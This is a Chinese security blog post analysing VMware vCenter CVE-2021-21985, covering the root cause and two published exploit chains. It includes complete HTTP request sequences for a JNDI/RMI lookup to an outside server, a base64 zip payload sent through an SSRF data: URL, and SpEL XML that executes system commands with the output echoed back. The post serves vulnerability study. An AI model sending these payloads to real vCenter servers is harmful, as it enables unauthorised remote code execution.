@@ -1,0 +1,290 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vcenter漏洞分析 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Vcenter漏洞分析"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Vcenter漏洞分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/06/07/Vcenter漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-06-07T03:41:52.000Z">
+          2021-06-07
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​        前阵子vcenter爆出了<code>CVE-2021-21985</code>漏洞，师傅们对这个漏洞提出了多种不同的利用方案，都非常的精彩，因此我搭建好了vcenter的环境，并对师傅们公开的利用方法进行了分析。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​        本来打算通过OVA来安装，试了7.0和6.5的版本，由于各种坑试了两天都没搭建成功，最后无奈在windows下进行安装，需要注意的是在SSO设置域名时，如果是在内网搭建的没有域名，改一下本地的hosts文件随便给个域名就可以了，最终选择6.7的版本进行安装。</p>
+<span id="more"></span>
+
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609090510560.png" alt="image-20210609090510560"></p>
+<p>​        接下来开启debug模式，参考<a target="_blank" rel="noopener" href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/">Vcenter Server CVE-2021-21985 RCE PAYLOAD</a>,直接在 C:\ProgramData\VMware\vCenterServer\cfg\vmware-vmon\svcCfgfiles\vsphere-ui.json 文件中取消remote debug注释即可。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210630101451825.png" alt="image-20210630101451825"></p>
+<p>​        切换到<code>C:\Program Files\VMware\vCenter Server\bin</code>目录下执行<code>service-control --restart vsphere-ui</code>重启vsphere-ui服务。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609114002611.png" alt="image-20210609114002611"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>​        这个漏洞原理并不复杂，在<code>com.vmware.vsan.client.services.ProxygenController#invokeService</code>中实现，根据传入的beanIdOrClassName参数获取bean，再通过methodName获取要调用bean的方法名，再通过body里的methodInput参数获取方法对应的参数，最终通过Invoke反射调用，所以可以调用当前环境中任意bean的任意public方法。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609133909212.png" alt="image-20210609133909212"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​        这个漏洞的主要亮点在于寻找利用的方式，通过上面的分析我们发现通过这个漏洞可以调用任意Bean的任意方法，所以漏洞利用的思路就在于找到一个Bean，里面存在某个恶意的方法，可以让我们执行命令或者进行文件写入，下面分析下网上已经公开的利用方式。</p>
+<h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>​        这种利用方式来自于<a target="_blank" rel="noopener" href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/">Vcenter Server CVE-2021-21985 RCE PAYLOAD</a>,利用者找到了一个<code>vsanProviderUtils_setVmodlHelper</code>，本质上是<code>org.springframework.beans.factory.config.MethodInvokingFactoryBean</code>。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609152623499.png" alt="image-20210609152623499"></p>
+<p>​        在MethodInvokingFactoryBean的父类<code>org.springframework.util.MethodInvoker</code>中的invoke方法中使用了反射调用，也就是如果我们能控制targetObject，preparedMethod和Arguments参数，就可以调用任意类的任意static方法。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609153217467.png" alt="image-20210609153217467"></p>
+<p>​        看了这种利用方式，我心里有很多疑问，下面我将通过提问的方式来解决我对于这种利用方式的疑惑。</p>
+<p><strong>为什么说是任意类的static方法？</strong></p>
+<p>在if语句中会进行判断，如果调用方法不为static则会抛异常。</p>
+<p><strong>能否调用private方法？</strong></p>
+<p>在<code>org.springframework.util.ReflectionUtils#makeAccessible(java.lang.reflect.Method)</code>中，判断是否为public方法，如果不是则设置访问属性。因此通过这个点可以调用private方法。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609155337609.png" alt="image-20210609155337609"></p>
+<p><strong>是否需要获取targetObject对象？</strong></p>
+<p>​    由于调用的是static方法，因此不用获取targetObject对象，通过调用setTargetObject设置TargetObject类型为null即可。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609155900421.png" alt="image-20210609155900421"></p>
+<p><strong>如何设置preparedMethod属性？</strong></p>
+<p>​    在<code>org.springframework.util.MethodInvoker#prepare</code>中，通过<code>targetClass.getMethod(targetMethod, argTypes)</code>为methodObject属性赋值。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609160346846.png" alt="image-20210609160346846"></p>
+<p>​        targetClass的获取有两种方式，当staticMethod的属性不为空时，可以通过staticMethod获取targetClass属性，当staticMethod属性为空时，则只能通过setTargetClass来为targetClass属性赋值。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609160705967.png" alt="image-20210609160705967"></p>
+<p>​        分析下这两种方式的利弊，当设置staticMethod属性时，会将staticMethod的最后一个.之前的内容赋值给targetMethod，resolveClassName方法将targetMethod当作类名，通过<code> ClassUtils.forName</code>得到对应的Class对象，也会取出最后一个.后的内容赋值给targetMethod属性，因此不用手工为targetMethod属性赋值。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609172110112.png" alt="image-20210609172110112"></p>
+<p>​        当通过setTargetClass来获取时，只能通过传入Class对象的方式，显然在当前的漏洞环境中无法传递一个Class对象，因此不能使用setTargetClass的方式为targetClass属性赋值。</p>
+<p>​        再看看如何给arguments属性赋值，通过setArguments方法传入一个数组为arguments属性赋值。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609173111254.png" alt="image-20210609173111254"></p>
+<p>​        最后通过脑图总结下。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210609175952191.png" alt="image-20210609175952191"></p>
+<p><strong>为什么可以通过多次请求给Bean不同属性赋值？</strong></p>
+<p>​        spring中bean默认是单例的，并且bean的生命周期从spring容器启动开始一直到spring容器的销毁，因此在spring运行过程中，如果没有修改scope作用域，每个bean都只有一个实例。</p>
+<p><strong>为什么传入的beanIdOrClassName参数需要加上&amp;?</strong></p>
+<p>​        由于访问的MethodInvokingFactoryBean是工厂bean,所以bean名称应该以&amp;符号为前缀。</p>
+<p><strong>是否有其他的点可以访问到MethodInvokingFactoryBean？</strong></p>
+<p>​        除了vsanProviderUtils_setVmodlHelper是MethodInvokingFactoryBean实例外，还有其他的Bean也是MethodInvokingFactoryBean的实例，也可以调用到MethodInvoker的invoke方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vsanCapabilityUtils_setVsanCapabilityCacheManager</span><br><span class="line">vsanFormatUtils_setUserSessionService</span><br><span class="line">vsphereHealthProviderUtils_setVsphereHealthServiceFactory</span><br><span class="line">vsanQueryUtil_setDataService</span><br><span class="line">vsanUtils_setMessageBundle</span><br><span class="line">vsanProviderUtils_setVsanServiceFactory</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用过程</strong></p>
+<ul>
+<li>设置TargetObject属性</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setTargetObject HTTP/1.1</span><br><span class="line">Host: test666.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=A5FF3A1A360FE32478CE8079C85ECF94; JSESSIONID=01983551E5225FD5E69BEA4A987D713D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;:[null]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>设置Arguments属性</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setArguments HTTP/1.1</span><br><span class="line">Host: test666.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=A5FF3A1A360FE32478CE8079C85ECF94; JSESSIONID=01983551E5225FD5E69BEA4A987D713D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 51</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;:[[&quot;rmi://192.168.5.11:9999/test666&quot;]]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>设置staticMethod</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setStaticMethod HTTP/1.1</span><br><span class="line">Host: test666.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=A5FF3A1A360FE32478CE8079C85ECF94; JSESSIONID=01983551E5225FD5E69BEA4A987D713D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;:[&quot;javax.naming.InitialContext.doLookup&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过prepare为methodObject赋值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/prepare HTTP/1.1</span><br><span class="line">Host: test666.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=A5FF3A1A360FE32478CE8079C85ECF94; JSESSIONID=01983551E5225FD5E69BEA4A987D713D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;:[]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>invoke反射调用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/invoke HTTP/1.1</span><br><span class="line">Host: test666.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=A5FF3A1A360FE32478CE8079C85ECF94; JSESSIONID=01983551E5225FD5E69BEA4A987D713D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;:[]&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="SPEL注入"><a href="#SPEL注入" class="headerlink" title="SPEL注入"></a>SPEL注入</h4><p>​        这种利用方式来自于漏洞的原作者<a target="_blank" rel="noopener" href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/">VCSA 6.5-7.0 远程代码执行 CVE-2021-21985 漏洞分析</a>,作者找到了<code>vmodlContext</code>，这个bean是<code>VmodlContextImpl</code>的实现类，通过调用这个类的<code>createContext</code>方法，并传入一个String数组，经过层层调用可以调用到实例化<code>ClassPathXmlApplicationContext</code>的逻辑，并将传入的String数组的内容赋值到<code>ClassPathXmlApplicationContext</code>的构造方法参数中，我们可以在远程服务器上创建一个XML文件，通过传入放置XML服务器的地址，让目标加载远程XML文件并对其中的bean的内容进行SPEL解析，由于这个bean的内容是我们可控的，因此可以执行恶意操作。</p>
+<p>​        由于之前对于SPEL的利用方式没有什么了解，因此通过下面解决下面几个问题快速入门下SPEL注入。</p>
+<p><strong>什么是SPEL？它可以做什么？</strong></p>
+<p>​    SPEL是一种类似于OGNL的表达式语言，它支持在运行时查询和操纵对象图。</p>
+<p><strong>Spring中如何使用SPEL?</strong></p>
+<p>​    SPEL表达式可以与 XML 或基于注解的配置元数据一起使用来定义BeanDefinition，定义表达式的语法为#{expression string}，需要注意的是，Class实例通过**T(全限定类名)**来引用，比如我们想执行命令，可以通过下面的代码来构造。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;Helloclass&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>ClassPathXmlApplicationContext何时执行SPEL？</strong></p>
+<p>​        首先简单介绍下ClassPathXmlApplicationContext，主要的作用在于从XML中加载定义的Bean，经过测试，当通过<code>new ClassPathXmlApplicationContext(&quot;xxx.xml&quot;);</code>时会对property中的value属性和bean的Class属性进行SPEL解析。</p>
+<p>​        在<code>org.springframework.beans.factory.support.AbstractBeanFactory#doResolveBeanClass</code>中会获取bean标签中class属性配置的内容并通过<code>evaluateBeanDefinitionString</code>执行SPEL表达式。这里需要注意一下，如果在class属性中传入的SPEL表达式没有返回一个Class对象或String类型的对象，会导致异常并影响后续对property属性的解析。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210622202719853.png" alt="image-20210622202719853"></p>
+<p>​        在<code>org.springframework.beans.factory.support.BeanDefinitionValueResolver#resolveValueIfNecessary</code>中会对传入的属性值做SPEL解析。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210622205943891.png" alt="image-20210622205943891"></p>
+<p><strong>ClassPathXmlApplicationContext为什么会加载远程xml？</strong></p>
+<p>​        在通过ClassPathXmlApplicationContext加载XML时，会调用<code>org.springframework.beans.factory.xml.XmlBeanDefinitionReader#loadBeanDefinitions(org.springframework.core.io.support.EncodedResource)</code>的getInputStream加载资源，具体调用哪些资源和传入的Resource类型有关系。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210623105151846.png" alt="image-20210623105151846"></p>
+<p>​        查阅官方文档存在<code>UrlResource</code>，利用<code>Urlresource</code>可以通过URL加载资源，值得注意的是除了<code>http</code>协议加载外，也可以通过<code>ftp</code>,<code>file</code>协议加载，<code>UrlResource</code>的getInputStream方法如下。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210623114012678.png" alt="image-20210623114012678"></p>
+<p>​        当然通过<code>UrlResource</code>加载远程XML的方式只能在服务器出网的情况下使用，如果服务器不出网，就不能通过这种方式。</p>
+<p><strong>何时对url做处理的？</strong></p>
+<p>​        根据漏洞作者的描述，传入的url中如果包含.会进行转义，我们看下代码中是怎么处理的，是否有其他的方法绕过限制。<code>VmodlContextImpl#getContextFileNameForPackage(java.lang.String)</code>中，会对我们传入的url中的<code>.</code>进行替换,所以我们传入的URL中不能包含<code>.</code>，并且会在请求url后加上<code>/context_v2.xml</code>，通过<code>ClassUtil.getCurrentClassLoader().getResource</code>加载<code>context_v2.xml</code>，但这个加载器不会加载远程的XML，所以我们远程的文件名必须指定为<code>/context.xml</code>。对于IP中<code>.</code>的转换，可以通过IP转数字型IP绕过。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210623175832733.png" alt="image-20210623175832733"></p>
+<p><strong>不出网如何利用</strong></p>
+<p>​        作者找到了一个存在ssrf漏洞的点，该漏洞位于<code>VsanHttpProvider.py</code>中，通过正则匹配获取请求的url，再通过urlopen获取响应内容，调用__doGetFileWithinZip进行解压。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210624144821421.png" alt="image-20210624144821421"></p>
+<p>​        在<code>_doGetFileWithinZip</code>中获取解压缩后的文件名，对文件名通过传入的正则<code>.*offline_bundle.*</code>,匹配成功则将文件内容读取并返回。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210624145205253.png" alt="image-20210624145205253"></p>
+<p>​        所以可以制作一个文件名为offline_bundle.xml的内容并制作成zip包，base编码后通过<code>data</code>协议进行发送。另外虽然利用时会拼接<code>/context.xml</code>但并不会影响<code>data</code>协议获取数据。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vsanHealth/vum/driverOfflineBundle/data://text/plain;base64,UEsDBBQABgAIANNz2FJepoT35wAAAJcBAAASAAAAb2ZmbGluZV9idW5kbGUueG1slZCxTsMwEIb3Sn0H6xiaDLFTWFBUtxtiKAsUidV1jtTg2JXP1JEQ707qdICxXnzD/53++1abobfshIGMdxKWvAaGTvvWuE7C6+6huofNej5b7VE5YmPYkYRDjMdGiJQSp2MYo+9B9Zh8+OQ+dIL0AXslMgLzGZteZpuBzD8+3WXktq6X4u1p+5LRyjiKymn8Q5Nppr1br1XMba+owa7IiummKvfnA7UwCjjfkCUw00p4RGu9tooIWP4k3Hzvig91Utwq1/HnLxdNjyXvMF7mouQ4oC4WWlm9KH9gzS5rs6mz5EnZOP0CUEsBAhQAFAAGAAgA03PYUl6mhPfnAAAAlwEAABIAJAAAAAAAAAAgAAAAAAAAAG9mZmxpbmVfYnVuZGxlLnhtbAoAIAAAAAAAAQAYAJ+7ZnHCaNcBrHTYccJo1wHYmeVXwmjXAVBLBQYAAAAAAQABAGQAAAAXAQAAAAA=/context.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210624155939617.png" alt="image-20210624155939617"></p>
+<p>​        通过上面的分析，可以构造如下请求进行利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:/ui/h5-vsan/rest/proxy/service/vmodlContext/createContext</span><br><span class="line">post:&#123;&quot;methodInput&quot;:[[&quot;https://localhost/vsanHealth/vum/driverOfflineBundle/data://text/plain;base64,UEsDBBQABgAIANNz2FJepoT35wAAAJcBAAASAAAAb2ZmbGluZV9idW5kbGUueG1slZCxTsMwEIb3Sn0H6xiaDLFTWFBUtxtiKAsUidV1jtTg2JXP1JEQ707qdICxXnzD/53++1abobfshIGMdxKWvAaGTvvWuE7C6+6huofNej5b7VE5YmPYkYRDjMdGiJQSp2MYo+9B9Zh8+OQ+dIL0AXslMgLzGZteZpuBzD8+3WXktq6X4u1p+5LRyjiKymn8Q5Nppr1br1XMba+owa7IiummKvfnA7UwCjjfkCUw00p4RGu9tooIWP4k3Hzvig91Utwq1/HnLxdNjyXvMF7mouQ4oC4WWlm9KH9gzS5rs6mz5EnZOP0CUEsBAhQAFAAGAAgA03PYUl6mhPfnAAAAlwEAABIAJAAAAAAAAAAgAAAAAAAAAG9mZmxpbmVfYnVuZGxlLnhtbAoAIAAAAAAAAQAYAJ+7ZnHCaNcBrHTYccJo1wHYmeVXwmjXAVBLBQYAAAAAAQABAGQAAAAXAQAAAAA=&quot;],true]&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210624164932358.png" alt="image-20210624164932358"></p>
+<p><strong>如何获取回显？</strong></p>
+<p>​        漏洞作者发现了<code>systemProperties</code>是properties对象的实例，通过调用<code>getProperty</code>方法可以获取配置的内容。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210624181222384.png" alt="image-20210624181222384"></p>
+<p>​        可以通过下面的方式调用<code>getProperty</code>方法获取<code>propterties</code>对象中的属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210624181816104.png" alt="image-20210624181816104"></p>
+<p>​    下面只要我们将命令执行的结果写入到properties属性中即可,但我经过分析其实不用通过这种方式，因为vcenter并没有屏蔽错误回显，只要让目标将执行的结果通过报错显示出来即可，因此构造如下XML。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;Helloclass&quot;</span> <span class="attr">class</span>=<span class="string">&quot;#&#123;new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(&#x27;whoami&#x27;).getInputStream())).lines().collect(T(java.util.stream.Collectors).joining())&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​        需要注意在请求的最后需要随便加一些字符，否则在拼接<code>/context.XML</code>后会报错。</p>
